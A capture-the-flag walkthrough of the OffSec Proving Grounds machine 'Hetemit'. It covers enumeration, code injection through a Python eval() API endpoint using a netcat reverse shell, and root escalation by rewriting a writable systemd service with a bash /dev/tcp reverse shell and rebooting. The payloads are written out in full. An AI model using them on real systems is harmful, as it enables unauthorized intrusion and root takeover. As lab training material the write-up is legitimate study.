# Hetemit — OffSec Proving Grounds Walkthrough

**Platform:** Proving Grounds Practice
**Difficulty:** Intermediate
**OS:** Linux (CentOS)

---

## TL;DR

Python Werkzeug API on port 50000 with `eval()` endpoint → RCE via `os.system()` → writable systemd service file → rewrite service to spawn root shell → `sudo reboot` → root.

---

## Enumeration

```bash
nmap -sV -p- 192.168.244.117
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | vsftpd 3.0.3 |
| 22 | SSH | OpenSSH 8.0 |
| 80 | HTTP | Apache httpd 2.4.37 (CentOS) |
| 139/445 | SMB | Samba 4.6.2 |
| 18000 | HTTP | Rails app |
| 50000 | HTTP | Werkzeug 1.0.1 (Python 3.6.8) |

The interesting services are the Rails app on 18000 and the **Werkzeug Python API on port 50000**.

---

## Exploitation — Python eval() API Abuse

Exploring the Werkzeug API on port 50000:

```bash
curl http://192.168.244.117:50000/generate
# {'email@domain'}
```

It takes an email parameter and returns a SHA256 hash. There's also a `/verify` endpoint:

```bash
curl --data "code=2*2" http://192.168.244.117:50000/verify
# 4
```

It **evaluates** the input. This is Python `eval()` — we can inject `os.system()`:

```bash
curl -si --data "code=os.system('nc 192.168.45.250 80 -e /bin/sh')" http://192.168.244.117:50000/verify
```

Shell caught as low-privilege user.

---

## Privilege Escalation — Writable Systemd Service

Checking sudo:

```bash
sudo -l
# (root) NOPASSWD: /usr/sbin/halt, /usr/sbin/reboot, /usr/sbin/shutdown
```

We can reboot the machine. Now let's find writable service files:

```bash
find /etc -type f -writable 2>/dev/null
```

We find the systemd service file for the Python webapp on port 50000. Overwrite it with a reverse shell:

```ini
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.250/80 0>&1'
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

Transfer and overwrite:

```bash
cat ser > /etc/systemd/system/pythonapp.service
```

Then reboot:

```bash
sudo reboot
```

When the machine comes back up, the service starts our reverse shell as root. **Root.** 🎉

---

## Key Takeaways

- **Python `eval()`** in APIs is incredibly dangerous — it allows arbitrary code execution by design
- **Writable systemd service files** combined with **sudo reboot** is a powerful escalation chain
- The sudo permissions seemed useless at first (halt/reboot/shutdown), but when combined with writable service files, they become a root path
- Always think about what runs **on boot** when you have reboot permissions

---

*Thanks for reading! Follow for more OffSec walkthrough content.*
